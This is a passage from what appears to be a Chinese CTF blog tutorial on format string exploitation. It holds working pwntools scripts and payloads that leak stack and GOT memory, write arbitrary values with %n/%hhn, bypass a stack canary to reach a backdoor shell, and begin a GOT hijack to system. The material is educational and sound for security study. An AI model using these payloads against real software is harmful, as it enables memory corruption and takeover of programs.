]%p%p%p%p%p%p%p%p%p%p%p%p.......</span><br></pre></td></tr></table></figure><br>[tag]为重复某个字符的字节长来作为tag，就是aaaa、bbbb这样就可以。后面个%p会将依次遍历以地址的形式打印出函数参数，试一下：<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151337.png" alt="Pasted image 20250211151337"><br>我们输入的AAAA对应后面到0x41414141，也就是格式化字符串的第四个参数，当然我们也可以使用前面的方法：</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AAAA%<span class="number">4</span>$p</span><br></pre></td></tr></table></figure><p>那么我们想想，如果将AAAA替换成某个函数的got地址，那么程序就会打印出这个函数的真实地址。我们拿scanf函数举例，获取函数got地址就交给我们的pwntools了：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">__isoc99_scanf_got = elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>] #获取<span class="built_in">scanf</span>函数的got地址</span><br><span class="line">print hex(__isoc99_scanf_got)</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">&#x27;%4$s&#x27;</span> #将AAAA%<span class="number">4</span>$p中的A替换成<span class="built_in">scanf</span>函数的got地址</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line">print hex(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>]))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151436.png" alt="Pasted image 20250211151436"></p><h3 id="3-覆盖内存"><a href="#3-覆盖内存" class="headerlink" title="3. 覆盖内存"></a>3. 覆盖内存</h3><p>前面我们通过格式化字符串来泄露栈内存以及任意地址内存，那么这部分我们直接修改栈上变量的值。想要进行覆盖，势必要有一个东西能有写的能力。这个时候就用到了%n<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br></pre></td></tr></table></figure><br>…[ overwrite addr ]….%[ overwrite offset ]$n<br>**其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数</p><p>一般来说，利用分为以下的步骤：<br>• 确定覆盖地址<br>• 确定相对偏移（找格式化字符串中第几个参数）<br>• 进行覆盖</p><p>举例：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>简单的讲一下这个例子，三个整型变量a=123、b=456、c=789。a、b是全局变量，c是局部变量，数组s等待我们从scanf函数输入。可以明显的看到第二个printf函数存在格式化字符串漏洞。最后是三个判断，如果c = 16就打印“modified c.”，如果a = 2就打印“modified a for a small number.”，如果b = 0x12345678就打印“modified b for a big number!”</p><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>这里我们选择让c = 16，使程序打印“modified c.”，可以从源码中看到第一次printf打印出了变量c的地址，所以不需要额外找了<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br></pre></td></tr></table></figure><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211152005.png" alt="Pasted image 20250211152005"><br>我们可以通过结果看到变量s(c的地址)是在格式化字符串的第6个参数，接下来就可以根据上面的公式来构造payload了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">c_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) <span class="comment">#获取c变量的地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(c_addr)</span><br><span class="line">payload = p32(c_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">&#x27;%6$n&#x27;</span> <span class="comment">#构建payload</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>首先第一个c_addr就是变量c的地址，可以通过接收第一次printf打印出来的字符获得。因为前面的c_addr已经占了4个字节，第二个%012d是为了补全16个字节，最后的%6$n是为了向第6个参数内写16，这个16就是前面的16个字节。这就是%n的能力<br>执行结果如下，可以看到输出的“modified c.”字符串：<img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211152220.png" alt="Pasted image 20250211152220"></p><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>这个小是什么小呢，是小于机器字长的数字。拿2举例子，如果我想向变量中存一个2，那就会出现问题，回想一下刚在我们做的例子，%n会将前面输入的字节数存放到指定的参数地址中。但是我们将地址放在最前面，那么经过p32小端序转化之后地址本身就会占4个字节，所以经过%n存放的时候，向变量中写的数一定是大于等于4的，那这样一来我们想向变量中存放2的想法可能就要破灭了。我们拿a = 2举例，使程序输出字符串“modified a for a small number.”<br>但是我们想一想，地址一定要放在最前面吗，我们的%n是可以向指定的参数地址写入数字的，所以把原有的payload该一下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aa%k&#x27;</span> + <span class="string">&#x27;$naa&#x27;</span> +p32(a_addr)</span><br></pre></td></tr></table></figure><br>我们把前面的字符串拆分成两部分，每个部分四个字节，因为变量是从第六个参数开始的，所以aa%k是第6个、$naa是第7个、p32(a_addr)是第8个，所以k需要改成8，这样%n就会将“aa”这两个字符的字符数2写在第8个参数，即变量a的地址中：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aa%8&#x27;</span> + <span class="string">&#x27;$naa&#x27;</span> +p32(a_addr)</span><br></pre></td></tr></table></figure><br>那么这样一来偏移找到了，剩下的就是变量a的地址了，因为a已经进行过初始化了，所以使用ida可以在.data段找到：<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211154330.png" alt="Pasted image 20250211154330"><br>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">a_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211154405.png" alt="Pasted image 20250211154405"></p><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p>到这里为止，应该对<code>%k$n</code>有一定的了解了，还是那个原则，%k$n前面有多少个字节，那么就会向第k个参数地址中写多少。那么回来，覆盖大数字能有多大呢？拿b = 0x12345678举例，换成十进制的话就是305419896个字节，这就已经非常大了，我们没法构建一个超级长的payload的插入栈中，因为栈的长度可能都没有这么长😁</p><p>那么我们改变一下思路，我们一定要一次性写入0x12345678吗？存放变量b的地址空间有4个字节：<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211154435.png" alt="Pasted image 20250211154435"><br>因为在x86、x64中时按照小端序的形式存储的，所以以b_addr作为基地址开始，依次从右向左在每个字节中写入内容。也就是说我们不必须一次性将变量b的所有位置填满，可以一个字节一个字节的填充。这样填充的方法就用到了格式化字符串里面的两个标志位了：</p><blockquote><p>h：对于整数类型，printf 期待一个从 short 提升的 int 尺寸的整型参数<br>hh：对于整型类型，printf 期待一个从 char 提升的 int 尺寸的整形参数</p></blockquote><p>定义很复杂，简单点说如果我们使用了h标志位，那么就会向变量b中一次性写两个字节，写两次填满。使用hh标志位会向变量b中一次性写一个字节，写四次填满。那么我们去想，如果将b_addr放在格式化字符串的第六个参数位置、b_addr + 1放在第7个参数位置、b_addr + 2放在第8个参数位置、b_addr + 3放在第9个参数位置。再通过<code>%6$hhn</code>、<code>%7$hhn</code>、<code>%8$hhn</code>、<code>%9$hhn</code>将0x78、0x56、0x34、0x12写进去是不是就可以了！<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br></pre></td></tr></table></figure></p><ul><li>前面的四个p32每个占4字节，一共16个字节，%104x占104个字节，所以104 + 16 = 120 =0x78，所以%6$hhn会将0x78写到第6个参数，即p32(b_addr)的位置</li><li>%222x占222个字节，再加上前面的字节数：120 + 222 = 342 = 0x156，因为hh是单字，所以只取后面的0x56，所以%7$hhn会将0x56写到第7个参数，即p32(b_addr + 1)的位置</li><li>%222x占222个字节，再加上前面的字节数：342 + 222 = 564 = 0x234，因为hh是单字，所以只取后面的0x34，所以%8$hhn会将0x34写到第8个参数，即p32(b_addr + 2)的位置</li><li>%222x占222个字节，再加上前面的字节数：564 + 222 = 0x312，因为hh是单字，所以只取后面的0x12，所以%9$hhn会将0x12写到第9个参数，即p32(b_addr + 3)的位置<br>这样一来我们就完成了对变量b四个字节的填充，填充之后b = 0x12345678，剩下的就是寻找b的地址了，依然还是使用ida在.data里面找到b的地址：<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211162441.png" alt="Pasted image 20250211162441"><br>这样一来b_addr = 0x0804A028<br>exp如下：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">b_addr=<span class="number">0x0804A028</span></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sh.sendline(fmtstr_payload(6, &#123;0x804A028:0x12345678&#125;))</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>结果如下，会看到程序打印字符串“modified b for a big number!”<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211162513.png" alt="Pasted image 20250211162513"></li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="例-1-x64"><a href="#例-1-x64" class="headerlink" title="例(1) x64"></a>例(1) x64</h3><blockquote><p>ubuntu24.04运行不了，抄的别的师傅的<br>64位格式化字符串和32位的很相似，做题的步骤也相同，唯一不同的是64位程序对函数参数存储的方式和32位的不同。64为程序会优先将函数的前6个参数放置在寄存器中，超过6个的再存放在栈上，而32位直接存放在栈上。</p></blockquote><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211225455.png" alt="Pasted image 20250211225455"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211230001.png" alt="Pasted image 20250211230001"><br>使用gdb打开一下，依然还是在printf处下断点</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b <span class="built_in">printf</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x400640</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/hollk/ctf-challenges/pwn/fmtstr/<span class="number">2017</span>-UIUCTF-pwn200-GoodLuck/goodluck </span><br><span class="line">what<span class="number">&#x27;</span>s the flag</span><br><span class="line">hollk</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211225615.png" alt="Pasted image 20250211225615">可以看到我们停在了printf函数处。64位程序需要先往寄存器上看，因为格式化字符串作为printf函数的第一个参数，所以理所应当的存放在rdi寄存器中，剩下的RSI、RDX、RCX、R8、R9这5个寄存器会接着存放其他参数。上面看完了往栈上看，可以看到栈顶为printf函数的返回地址，我们想要的flag在返回地址下的第四个。所以如果我们想要打印flag，那么flag距离格式化字符串的偏移就是5 + 4 = 9</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%9$s&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211230103.png" alt="Pasted image 20250211230103"></p><h3 id="例-2-绕过Canary"><a href="#例-2-绕过Canary" class="headerlink" title="例(2) 绕过Canary"></a>例(2) 绕过Canary</h3><blockquote><p><a href="https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg">https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg</a><br>提取码:4egx</p></blockquote><p>走一套流程<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212125542.png" alt="Pasted image 20250212125542"><br>32位文件，开启了NX和Canary保护</p><blockquote><p>Canary简介：Canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上（最低位都是\x00），当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是栈溢出或者其他原因导致Canary的值发生变化，那么程序将执行<code>___stack_chk_fail</code>函数，继而终止程序。</p><h2 id="所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。"><a href="#所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。" class="headerlink" title="所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。"></a>所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。</h2><p>Canary绕过方式一般canary有两种利用方式：<br>1.爆破canary<br>2.如果存在字符串格式化漏洞可以输出canary并利用溢出覆盖canary从而达到绕过</p><h2 id="这里我们采用第二种利用方法：printf属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。"><a href="#这里我们采用第二种利用方法：printf属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。" class="headerlink" title="这里我们采用第二种利用方法：printf属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。"></a>这里我们采用第二种利用方法：printf属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。</h2></blockquote><p>进IDA看一下main函数开头和结尾的汇编<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130000.png" alt="Pasted image 20250212130000"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130035.png" alt="Pasted image 20250212130035"><br>以上证实了程序开启了Canary保护<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130133.png" alt="Pasted image 20250212130133"><br>再看一下伪代码<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130229.png" alt="Pasted image 20250212130229"><br>发现了printf(格式化字符串漏洞)和易导致栈溢出的函数gets<br>同时发现后门<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130214.png" alt="Pasted image 20250212130214"><br>大致解题思路如下：<strong>覆盖至main函数的Cananry处，填上正确的Canary，然后覆盖返回地址为后门函数处，即可拿到shell</strong><br>根据汇编可知寄存器edx里存的就是Canary的值<br>我们在printf和main函数末尾的xor下断点</p><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212132656.png" alt="Pasted image 20250212132656"><br>0xffffc620为format在stack中的位置<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212132542.png" alt="Pasted image 20250212132542"><br>EDX的值就是Canary的值<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212132749.png" alt="Pasted image 20250212132749"><br>看内存，Canary的值与format相距15<br>Canary的偏移为15，这样我们在第一次gets时发送<code>%15$x</code>就会（printf)泄露出canary<br>的值</p><blockquote><p><code>%s</code>：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p></blockquote><p>然后我们确定gets到Canary的偏移<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212133441.png" alt="Pasted image 20250212133441"><br>由前面分析可知v5里就是Canary的值<br>在IDA中查看可知s到v5的偏移为0x2c-0x04=40<br><strong><em>EBP下面为return_address</em></strong><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212134019.png" alt="Pasted image 20250212134019"><br>canary在[ESP+0x3c]=0xffffc65c，EBP在0xffffc668，相减等于12<br>完成如下exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./binary_200&#x27;</span>) </span><br><span class="line">sys = <span class="number">0x0804854d</span></span><br><span class="line">p.sendline(<span class="string">&#x27;%15$x&#x27;</span>)</span><br><span class="line">Canary = <span class="built_in">int</span>(p.recv(),<span class="number">16</span>)   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Canary:&#x27;</span>,<span class="built_in">hex</span>(Canary))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p32(Canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212135349.png" alt="Pasted image 20250212135349"><br>同时可以看出Canary是变化的<br><strong><em>getshell</em></strong></p><h3 id="例-3-hijack-GOT"><a href="#例-3-hijack-GOT" class="headerlink" title="例(3) hijack GOT"></a>例(3) hijack GOT</h3><blockquote><p><a href="https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA">https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA</a><br>提取码：140h</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>现在的C程序中，libc的函数是通过GOT表来实现跳转的。在没有开启RELRO(或开启Partial RELRO）保护的前提下，每个libc的函数对应的GOT表项是可以被修改的。因此修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。<br>假设我们将函数A的地址覆盖为函数B的地址，那么这一攻击技巧可以分为以下步骤</p><ul><li>确定函数A的GOT表地址<br>  主要利用函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找</li><li>确定函数B的内存地址<br>  需要想办法泄露对应函数B的地址</li><li>将函数B的内存写入到函数A的GOT表地址处<br>  需要利用函数的漏洞来触发<pre><code>  写入函数：write函数  ROP  - `pop eax; ret; # printf@got -&gt; eax`  - ` pop ebx; ret; # (addr_offset = system_addr - printf_addr) -&gt; ebx`  - `add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset`  格式化字符串任意地址写</code></pre><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212140021.png" alt="Pasted image 20250212140021"><br>32位，只开启了NX(栈不可执行保护)</li></ul></blockquote><h5 id="查看文件执行流程"><a href="#查看文件执行流程" class="headerlink" title="查看文件执行流程"></a>查看文件执行流程</h5><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164428.png" alt="Pasted image 20250212164428"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164533.png" alt="Pasted image 20250212164533"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164645.png" alt="Pasted image 20250212164645"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164657.png" alt="Pasted image 20250212164657"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164940.png" alt="Pasted image 20250212164940"><br>自己运行一下这个程序了解该程序的功能，总的来说该程序模拟了一个文件创建读取软件</p><h5 id="getshell思路"><a href="#getshell思路" class="headerlink" title="getshell思路"></a>getshell思路</h5><p>无现成的system和bin/sh，尝试泄露libc<br>同时，除了一个格式化字符串漏洞之外，其他地方没有什么问题<br>我们尝试用printf函数来泄露函数的真实地址<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212170014.png" alt="Pasted image 20250212170014"></p><h6 id="确定格式化字符串偏移"><a href="#确定格式化字符串偏移" class="headerlink" title="确定格式化字符串偏移"></a>确定格式化字符串偏移</h6><p>简单逆向分析处密码<code>rxraclhm</code><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212171550.png" alt="Pasted image 20250212171550"><br>从栈上或输出均可判断输入的字符串偏移为7</p><h6 id="泄露puts函数地址"><a href="#泄露puts函数地址" class="headerlink" title="泄露puts函数地址"></a>泄露puts函数地址</h6><p>已知字符串偏移为7，然后利用pwntools的ELF模块可知puts@got的地址，构建如下payload<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br></pre></td></tr></table></figure></p><blockquote><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p></blockquote><p>我们将%s放在第7位，puts@got放在第8位，这样%8$s就会把puts函数的真实地址打印出来了。为什么要这样布置呢，其实是为了方便接收打印出来的字符串。<strong>这样布置后puts函数的真实地址会在前4个字节打出来，所以只需要接收前四个就可以了</strong>。</p><blockquote><p>当然你也可以选择：payload=p32(puts_got) +’%7$s’<br>这种方式，不过打印出来的内容需要从<strong>第5个字节开始接收</strong></p></blockquote><p>这样即可得到程序运行时puts函数的真实地址<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure></p><h6 id="找system函数地址"><a href="#找system函数地址" class="headerlink" title="找system函数地址"></a>找system函数地址</h6><p>如果是远程pwn，我们去查找一下libc对应版本即可<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212172938.png" alt="Pasted image 20250212172938"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.address=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><h6 id="覆盖puts函数"><a href="#覆盖puts函数" class="headerlink" 